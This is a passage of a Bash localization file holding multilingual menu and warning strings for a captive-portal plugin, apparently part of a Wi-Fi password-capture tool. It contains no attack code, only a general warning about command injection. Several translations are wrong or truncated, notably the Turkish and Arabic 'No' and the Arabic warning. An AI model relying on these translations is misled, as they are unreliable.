	arr["GERMAN","custom_portals_text_7"]="\${pending_of_translation} WARNUNG: Das Aktivieren der Erkennung von Passwörtern mit *&/?<> Zeichen ist sehr gefährlich, da Injektionen auf der Seite des Captive-Portals vorgenommen werden können und der Hacker durch eine Art Befehlsinjektion auf der Seite des Captive-Portals gehackt werden könnte. AKTIVIERUNG AUF EIGENES RISIKO!"
	arr["TURKISH","custom_portals_text_7"]="\${pending_of_translation} UYARI: *&/?<> karakterlerini içeren şifrelerin tespitini etkinleştirmek çok tehlikelidir çünkü girişler sabit portal sayfasında yapılabilir ve bilgisayar korsanı, sabit portal sayfasında bir tür komut enjeksiyonu ile hacklenebilir. RİSK SİZE AİT ETKİNLEŞTİRİN!"
	arr["ARABIC","custom_portals_text_7"]="\${pending_of_translation} تحذير: يعد تمكين اكتشاف كلمات المرور التي تحتوي على أحرف * & /؟ نشط على مسؤوليتك الخاصة!"

	arr["ENGLISH","custom_portals_text_8"]=" 1) No"
	arr["SPANISH","custom_portals_text_8"]="\${pending_of_translation} 1) No"
	arr["FRENCH","custom_portals_text_8"]="\${pending_of_translation} 1) Non"
	arr["CATALAN","custom_portals_text_8"]="\${pending_of_translation} 1) No"
	arr["PORTUGUESE","custom_portals_text_8"]="\${pending_of_translation} 1) Não"
	arr["RUSSIAN","custom_portals_text_8"]="\${pending_of_translation} 1) Нет"
	arr["GREEK","custom_portals_text_8"]="\${pending_of_translation} 1) Οχι"
	arr["ITALIAN","custom_portals_text_8"]=" 1) No"
	arr["POLISH","custom_portals_text_8"]="\${pending_of_translation} 1) Nie"
	arr["GERMAN","custom_portals_text_8"]="\${pending_of_translation} 1) Nein"
	arr["TURKISH","custom_portals_text_8"]="\${pending_of_translation} 1) Numara"
	arr["ARABIC","custom_portals_text_8"]="\${pending_of_translation} 1) رقم"

	arr["ENGLISH","custom_portals_text_9"]=" 2) Yes"
	arr["SPANISH","custom_portals_text_9"]="\${pending_of_translation} 2) Sí"
	arr["FRENCH","custom_portals_text_9"]="\${pending_of_translation} 2) Oui"
	arr["CATALAN","custom_portals_text_9"]="\${pending_of_translation} 2) Sí"
	arr["PORTUGUESE","custom_portals_text_9"]="\${pending_of_translation} 2) Sim"
	arr["RUSSIAN","custom_portals_text_9"]="\${pending_of_translation} 2) да"
	arr["GREEK","custom_portals_text_9"]="\${pending_of_translation} 2) Ναί"
	arr["ITALIAN","custom_portals_text_9"]=" 2) Si"
	arr["POLISH","custom_portals_text_9"]="\${pending_of_translation} 2) Tak"
	arr["GERMAN","custom_portals_text_9"]="\${pending_of_translation} 2) Ja"
	arr["TURKISH","custom_portals_text_9"]="\${pending_of_translation} 2) Evet"
	arr["ARABIC","custom_portals_text_9"]="\${pending_of_translation} 2) نعم"

	arr["ENGLISH","custom_portals_text_10"]="Detection of passwords containing *&/?<> characters is DISABLED"
	arr["SPANISH","custom_portals_text_10"]="\${pending_of_translation} La detección de contraseñas que contienen *&/?<> caracteres está DESACTIVADA"
	arr["FRENCH","custom_portals_text_10"]="\${pending_of_translation} La détection des mots de passe contenant les caractères *&/?<> est DÉSACTIVÉE"
	arr["CATALAN","custom_portals_text_10"]="\${pending_of_translation} La detecció de contrasenyes que contenen caràcters *&/?<> està DESACTIVADA"
	arr["PORTUGUESE","custom_portals_text_10"]="\${pending_of_translation} A detecção de senhas contendo caracteres *&/?<> está DESATIVADA"
	arr["RUSSIAN","custom_portals_text_10"]="\${pending_of_translation} ОТКЛЮЧЕНО обнаружение паролей, содержащих символы *&/?<>"
	arr["GREEK","custom_portals_text_10"]="\${pending_of_translation} Ο εντοπισμός κωδικών πρόσβασης που περιέχουν χαρακτήρες *&/?<> είναι ΑΠΕΝΕΡΓΟΠΟΙΗΜΕΝΟΣ"
	arr["ITALIAN","custom_portals_text_10"]="Il rilevamento delle password contenenti i caratteri *&/?<> è DISATTIVATO"
	arr["POLISH","custom_portals_text_10"]="\${pending_of_translation} Wykrywanie haseł zawierających znaki *&/?<> jest WYŁĄCZONE"
	arr["GERMAN","custom_portals_text_10"]="\${pending_of_translation} Die Erkennung von Passwörtern mit *&/?<> Zeichen ist DEAKTIVIERT"
	arr["TURKISH","custom_portals_text_10"]="\${pending_of_translation} *&/?<> karakterlerini içeren şifrelerin algılanması DEVRE DIŞI"
	arr["ARABIC","custom_portals_text_10"]="\${pending_of_translation} تم تعطيل الكشف عن كلمات المرور التي تحتوي على * & /؟"

	arr["ENGLISH","custom_portals_text_11"]="WARNING: detection of passwords containing *&/?<> characters is ENABLED!"
	arr["SPANISH","custom_portals_text_11"]="\${pending_of_translation} ADVERTENCIA: ¡la detección de contraseñas que contienen caracteres *&/?<> Está HABILITADA!"
	arr["FRENCH","custom_portals_text_11"]="\${pending_of_translation} ATTENTION: la détection des mots de passe contenant des caractères *&/?<> Est ACTIVÉE!"
	arr["CATALAN","custom_portals_text_11"]="\${pending_of_translation} ADVERTIMENT: la detecció de contrasenyes que contenen caràcters *&/?<> Està habilitada!"
	arr["PORTUGUESE","custom_portals_text_11"]="\${pending_of_translation} AVISO: a detecção de senhas que contêm caracteres *&/?<> Está ATIVADA!"
	arr["RUSSIAN","custom_portals_text_11"]="\${pending_of_translation} ВНИМАНИЕ: обнаружение паролей, содержащих символы *&/?<> ВКЛЮЧЕНО!"
	arr["GREEK","custom_portals_text_11"]="\${pending_of_translation} ΠΡΟΕΙΔΟΠΟΙΗΣΗ: Η ανίχνευση κωδικών πρόσβασης που περιέχουν χαρακτήρες *&/?<> ΕΝΕΡΓΟΠΟΙΗΘΕΙ!"
	arr["ITALIAN","custom_portals_text_11"]="ATTENZIONE: il rilevamento di password contenenti caratteri *&/?<> È ABILITATO!"
	arr["POLISH","custom_portals_text_11"]="\${pending_of_translation} OSTRZEŻENIE: wykrywanie haseł zawierających znaki *&/?<> Jest WŁĄCZONE!"
	arr["GERMAN","custom_portals_text_11"]="\${pending_of_translation} WARNUNG: Die Erkennung von Passwörtern mit *&/?<> Zeichen ist AKTIVIERT!"
	arr["TURKISH","custom_portals_text_11"]="\${pending_of_translation} UYARI: *&/?<> Karakterleri içeren şifrelerin tespiti ETKİN!"
	arr["ARABIC","custom_portals_text_11"]="\${pending_of_translation} تحذير: تم تمكين اكتشاف كلمات المرور التي تحتوي على * & /؟ <> أحرف"

	arr["ENGLISH","custom_portals_text_12"]="Invalid choice!"
	arr["SPANISH","custom_portals_text_12"]="\${pending_of_translation} ¡Elección inválida!"
	arr["FRENCH","custom_portals_text_12"]="\${pending_of_translation} Choix invalide!"
	arr["CATALAN","custom_portals_text_12"]="\${pending_of_translation} Elecció no vàlida!"
	arr["PORTUGUESE","custom_portals_text_12"]="\${pending_of_translation} Escolha inválida!"
	arr["RUSSIAN","custom_portals_text_12"]="\${pending_of_translation} Неверный выбор!"
	arr["GREEK","custom_portals_text_12"]="\${pending_of_translation} Μη έγκυρη επιλογή!"
	arr["ITALIAN","custom_portals_text_12"]="Scelta non valida!"
	arr["POLISH","custom_portals_text_12"]="\${pending_of_translation} Nieprawidłowy wybór!"
	arr["GERMAN","custom_portals_text_12"]="\${pending_of_translation} Ungültige Wahl!"
	arr["TURKISH","custom_portals_text_12"]="\${pending_of_translation} Geçersiz seçim!"
	arr["ARABIC","custom_portals_text_12"]="\${pending_of_translation} اختيار غير صحيح"
}

initialize_custom_portals_language_strings
